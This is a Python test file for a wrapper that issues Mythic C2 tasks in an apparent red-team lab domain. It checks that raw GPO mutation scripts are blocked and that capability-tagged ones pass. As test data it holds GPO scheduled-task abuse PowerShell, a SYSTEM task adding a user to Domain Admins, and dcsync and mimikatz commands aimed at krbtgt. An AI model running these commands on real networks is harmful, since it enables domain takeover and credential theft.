    assert "shell substitute rejected" in item["failure_reason"]


def test_issue_path_blocks_command_absent_from_live_payload_surface(monkeypatch):
    mt = _make_tools()
    mt._command_schema_cache["merlin"] = [
        _live_command_schema("run", _string_param("executable"), _string_param("arguments", required=False)),
    ]
    calls = {}

    async def fake_payload_type(_callback_display_id):
        return "merlin"

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)

    with _split_issue("should not issue", calls):
        output = asyncio.run(mt.issue_task_and_waitfor_task_output(
            "ticket_cache_purge",
            {"all": True, "serviceName": "", "luid": ""},
            2,
            timeout=5,
        ))

    assert calls == {}
    assert "not available on live payload 'merlin'" in output


def test_raw_gpo_mutation_powerpick_is_blocked_before_issue():
    mt = _make_tools()
    script = (
        "$taskFile='\\\\north.local\\SYSVOL\\north.local\\Policies\\{GUID}"
        "\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml'\n"
        "Set-Content -Path $taskFile -Value '<ScheduledTasks />'\n"
        "$de=New-Object DirectoryServices.DirectoryEntry('LDAP://CN={GUID},CN=Policies,CN=System,DC=north,DC=local')\n"
        "$de.Properties['versionNumber'].Value=$old+65536\n"
        "$de.CommitChanges()"
    )
    calls = {}

    with _split_issue("should not issue", calls):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output(
            "powerpick",
            {"command": script},
            13,
            timeout=5,
        ))

    assert "raw GPO mutation scripts are blocked" in result
    assert calls == {}


def test_raw_gpo_readonly_powerpick_inspection_is_allowed():
    mt = _make_tools()
    script = (
        "$taskFile='\\\\north.local\\SYSVOL\\north.local\\Policies\\{GUID}"
        "\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml'\n"
        "$de=New-Object DirectoryServices.DirectoryEntry('LDAP://CN={GUID},CN=Policies,CN=System,DC=north,DC=local')\n"
        "Get-Content $taskFile -Raw\n"
        "Write-Output $de.Properties['versionNumber'].Value"
    )
    calls = {}

    with _split_issue("inspection ok", calls):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output(
            "powerpick",
            {"command": script},
            13,
            timeout=5,
        ))

    assert result == "inspection ok"
    assert calls["issued"][0]["parameters"] == script


def test_deterministic_gpo_capability_powerpick_mutation_is_allowed():
    mt = _make_tools()
    script = (
        "$taskFile='\\\\north.local\\SYSVOL\\north.local\\Policies\\{GUID}"
        "\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml'\n"
        "Set-Content -Path $taskFile -Value '<ScheduledTasks />'\n"
        "$de=New-Object DirectoryServices.DirectoryEntry('LDAP://CN={GUID},CN=Policies,CN=System,DC=north,DC=local')\n"
        "$de.Properties['versionNumber'].Value=$old+1\n"
        "$de.CommitChanges()"
    )
    mt._deterministic_capability_command_contexts[
        mythic_tools._capability_command_key("powerpick", script)
    ] = {
        "capability": "gpo-controlled-system-exec",
        "expected_probe": "extract_gpo_system_exec_probe",
        "produces": ["artifact:gpo_immediate_task"],
    }
    calls = {}

    with _split_issue("capability ok", calls):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output("powerpick", script, 13, timeout=5))

    assert result == "capability ok"
    assert calls["issued"][0]["parameters"] == script


def test_deterministic_gpo_structured_artifact_read_does_not_record_effect():
    mt = _make_tools()

    async def no_schema(command, callback_display_id):
        return []

    async def no_validation(command, parameters, callback_display_id):
        return None

    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=starkwallpaper;domain=north.sevenkingdoms.local",
        preconditions=["generic-write:gpo:starkwallpaper"],
        effects=["system-exec:gpo:starkwallpaper@north.sevenkingdoms.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo": "starkwallpaper",
            "callback_id": "3",
        },
    )
    params = (
        r"type \\north.sevenkingdoms.local\SYSVOL\north.sevenkingdoms.local\Policies\{GUID}"
        r"\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
    )
    mt._deterministic_capability_command_contexts[
        mythic_tools._capability_command_key("shell", params)
    ] = {
        "capability": action.name,
        "target": action.target,
        "effects": list(action.effects),
        "intent": dict(action.intent),
        "action": asdict(action),
        "purpose": "read back the structured setup artifact and validate it before waiting on effects",
        "expected_probe": "extract_gpo_system_exec_probe",
        "produces": ["artifact:xml_validated"],
        "consumes": ["artifact:gpo_immediate_task"],
    }
    mt._fetch_command_schema = no_schema
    mt._validate_command_parameters = no_validation
    output = (
        "<ScheduledTasks><Task><Properties><Author>NT AUTHORITY\\SYSTEM</Author>"
        "<Arguments>/c net group &quot;Domain Admins&quot; samwell.tarly /add /domain</Arguments>"
        "</Properties></Task></ScheduledTasks>"
    )

    with _split_issue(output, display_id=7105):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output("shell", params, 3, timeout=5))

    assert "NT AUTHORITY\\SYSTEM" in result
    assert mt._engagement_hops == []


def test_delayed_capability_proof_poll_bypasses_duplicate_failure_breaker():
    mt = _make_tools()
    command_obj = {
        "command": "shell",
        "parameters": r"type \\north.local\SYSVOL\north.local\Policies\{GUID}\proof.txt",
        "expected_probe": "extract_gpo_system_exec_probe",
        "consumes": ["artifact:gpo_immediate_task", "event:group_policy_refresh"],
        "produces": [],
        "purpose": "read the marker written by the GPO SYSTEM task; only this proof can record system-exec",
    }
    mt._task_failure_counts[
        mt._task_failure_key(command_obj["command"], 13, command_obj["parameters"])
    ] = 2
    calls = {}

    with _split_issue("The system cannot find the file specified.", calls, display_id=7102):
        item = asyncio.run(mt._execute_capability_command(command_obj, 13, timeout=5))

    assert calls["issue"] == 1
    assert item["task_id"] == 7102
    assert "cannot find the file" in item["_output"].casefold()


def test_rewrite_shell_like_run_handles_cmd_wrapper_and_builtin():
    mt = _make_tools()

    assert mt._rewrite_shell_like_run(
        "run",
        r"cmd.exe /c dir \\winterfell.north.sevenkingdoms.local\C$",
    ) == ("shell", r"dir \\winterfell.north.sevenkingdoms.local\C$")
    assert mt._rewrite_shell_like_run(
        "run",
        r"dir \\winterfell.north.sevenkingdoms.local\C$",
    ) == ("shell", r"dir \\winterfell.north.sevenkingdoms.local\C$")


def test_rewrite_shell_like_run_preserves_native_executable():
    mt = _make_tools()

    assert mt._rewrite_shell_like_run("run", "net group \"Domain Admins\" /domain") == (
        "run",
        "net group \"Domain Admins\" /domain",
    )


def test_native_dcsync_issue_path_qualifies_before_mythic_task():
    mt = _make_tools()

    async def dcsync_schema(command, callback_display_id):
        assert command == "dcsync"
        return [
            {
                "cli_name": "Domain",
                "name": "Domain",
                "parameter_group_name": "Default",
                "type": "String",
                "choices": [],
                "required": True,
                "default_value": "",
            },
            {
                "cli_name": "User",
                "name": "User",
                "parameter_group_name": "Default",
                "type": "String",
                "choices": [],
                "required": True,
                "default_value": "",
            },
            {
                "cli_name": "DC",
                "name": "DC",
                "parameter_group_name": "Default",
                "type": "String",
                "choices": [],
                "required": False,
                "default_value": "",
            },
        ]

    async def no_validation(command, parameters, callback_display_id):
        return None

    mt._fetch_command_schema = dcsync_schema
    mt._validate_command_parameters = no_validation
    calls = {}

    with _split_issue("Hash NTLM: 2b576acbe6bcfda7294d6bd18041b8fe", calls):
        out = asyncio.run(mt.issue_task_and_waitfor_task_output(
            "dcsync",
            {
                "domain": "north.sevenkingdoms.local",
                "user": "krbtgt",
                "dc": "winterfell.north.sevenkingdoms.local",
            },
            2,
            timeout=5,
        ))

    assert "Hash NTLM" in out
    assert calls["issued"] == [{
        "command_name": "dcsync",
        "parameters": {
            "Domain": "north.sevenkingdoms.local",
            "User": "NORTH\\krbtgt",
            "DC": "winterfell.north.sevenkingdoms.local",
        },
        "callback_display_id": 2,
    }]


def test_qualify_dcsync_params_mimikatz_string():
    mt = _make_tools()
    out = mt._qualify_dcsync_params(
        "execute_assembly",
        '{"Assembly":"mimikatz.exe","Arguments":"lsadump::dcsync /domain:north.sevenkingdoms.local /user:krbtgt /dc:WINTERFELL"}')
    assert "/user:NORTH\\krbtgt" in json.loads(out)["Arguments"]


def test_qualify_dcsync_params_noop_for_non_dcsync():
    mt = _make_tools()
    params = '{"Path":"C:\\\\Users","User":"bob"}'  # has User, but no Domain/DC and not a dcsync command
    assert mt._qualify_dcsync_params("ls", params) == params
